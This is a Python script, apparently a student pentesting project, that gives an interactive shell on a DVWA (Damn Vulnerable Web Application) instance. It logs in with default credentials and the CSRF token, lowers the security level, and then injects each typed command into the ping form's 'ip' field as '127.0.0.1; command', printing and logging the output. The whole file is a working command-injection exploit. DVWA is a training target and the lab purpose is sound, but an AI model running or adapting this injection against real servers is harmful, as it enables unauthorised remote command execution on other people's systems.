import requests
import argparse
import os
from datetime import datetime

# ====================== BANNER ======================
BANNER = r"""
    _____   _____ __      __  _____ 
   |  __ \ / ____|\ \    / / |  __ \
   | |  | | (___   \ \  / /  | |__) |
   | |  | |\___ \   \ \/ /   |  ___/ 
   | |__| |____) |   \  /    | |     
   |_____/|_____/     \/     |_|      v1.0

   DVWA Command Injection Shell
   Educational Pentesting Framework
   by Brad - Cybersecurity Student Project
"""

def print_banner():
    print("\033[92m" + BANNER + "\033[0m")

# ====================== MAIN ======================
def main():
    parser = argparse.ArgumentParser(
        description="DVWA Command Injection Interactive Shell",
        epilog="Example: python3 bandito.py -t http://192.168.163.128"
    )
    parser.add_argument("-t", "--target", default="http://127.0.0.1",
                        help="DVWA base URL (no trailing slash)")
    parser.add_argument("-u", "--user", default="admin",
                        help="DVWA username")
    parser.add_argument("-p", "--password", default="password",
                        help="DVWA password")
    parser.add_argument("-l", "--log", default="dvwa_session.log",
                        help="Session log file")
    args = parser.parse_args()

    base_url = args.target.rstrip("/")
    log_file = args.log

    print_banner()
    print(f"[*] Target: {base_url}")
    print(f"[*] Username: {args.user}")
    print(f"[*] Logging to: {log_file}\n")

    session = requests.Session()

    # Connectivity test
    print("[*] Checking if target is reachable...")
    try:
        r = session.get(base_url, timeout=6)
        print(f"[+] HTTP {r.status_code}")
        if r.status_code not in (200, 301, 302):
            print("[-] Unexpected status - DVWA may not be at this path")
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        print("    Make sure DVWA is running and the URL is correct.")
        return

    # Login with CSRF token
    print("[*] Fetching login page for CSRF token...")
    login_url = f"{base_url}/login.php"
    try:
        r_get = session.get(login_url, timeout=6)
    except Exception as e:
        print(f"[-] Failed to reach login page: {e}")
        return

    if r_get.status_code != 200:
        print(f"[-] Login page returned HTTP {r_get.status_code}")
        return

    # Extract user_token
    token_marker = "name='user_token' value='"
    token_pos = r_get.text.find(token_marker)
    if token_pos == -1:
        print("[-] No CSRF token found - DVWA may have CSRF disabled or wrong path")
        user_token = ""
    else:
        start = token_pos + len(token_marker)
        end = r_get.text.find("'", start)
        user_token = r_get.text[start:end]
        print(f"[+] Token: {user_token}")

    # Attempt login
    print("[*] Submitting login...")
    login_data = {
        "username": args.user,
        "password": args.password,
        "user_token": user_token,
        "Login": "Login"
    }
    try:
        r_login = session.post(login_url, data=login_data, allow_redirects=True, timeout=6)
    except Exception as e:
        print(f"[-] Login POST failed: {e}")
        return

    # Check if login worked
    success_markers = ["Logout", "Welcome to Damn Vulnerable", "DVWA Security", "security.php"]
    if any(m in r_login.text for m in success_markers):
        print("[+] Login successful!")
    else:
        print("[-] Login appears to have failed")
        print("    Response snippet (first 500 chars):")
        print(r_login.text[:500])
        print("\nPossible fixes:")
        print("  - Wrong base URL (try -t http://192.168.163.128/dvwa)")
        print("  - Security level too high (set to Low manually first)")
        print("  - CSRF token issue (disable in config.inc.php for testing)")
        return

    # Set security to low
    print("[*] Setting security level to Low...")
    sec_url = f"{base_url}/security.php"
    sec_data = {"security": "low", "seclev_submit": "Submit"}
    session.post(sec_url, data=sec_data)

    # Fallback GET method
    session.get(f"{sec_url}?security=low")

    # Quick check if exec page is accessible
    vuln_url = f"{base_url}/vulnerabilities/exec/"
    print(f"[*] Checking exec page: {vuln_url}")
    r_test = session.get(vuln_url)
    if "Ping for free" in r_test.text or "ip" in r_test.text.lower():
        print("[+] Exec page looks accessible")
    else:
        print("[-] Exec page not reachable or not vulnerable")
        print("    Response snippet:")
        print(r_test.text[:300])

    print("\n[+] Shell ready. Type commands below.\n")

    # Logging function
    def log_cmd(cmd, output):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            f.write(f"[{ts}] CMD: {cmd}\nOUTPUT:\n{output}\n{'-'*70}\n")

    # Shell loop
    while True:
        try:
            cmd = input("\033[92mdvwa-shell>\033[0m ").strip()
            if cmd.lower() in ["exit", "quit", "q"]:
                print("[*] Exiting...")
                break
            if cmd.lower() == "help":
                print("help     - this menu")
                print("clear    - clear screen")
                print("exit/quit/q - exit")
                print("Any other = command to run")
                continue
            if cmd.lower() == "clear":
                os.system('clear' if os.name == 'posix' else 'cls')
                print_banner()
                continue
            if not cmd:
                continue

            payload = f"127.0.0.1; {cmd}"
            data = {"ip": payload, "Submit": "Submit"}

            r = session.post(vuln_url, data=data)

            # Extract output from <pre>
            if "<pre>" in r.text and "</pre>" in r.text:
                output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
            else:
                output = r.text.strip()

            print(output)
            log_cmd(cmd, output)
            print("-" * 70)

        except KeyboardInterrupt:
            print("\n[*] Interrupted - type exit to quit")
        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()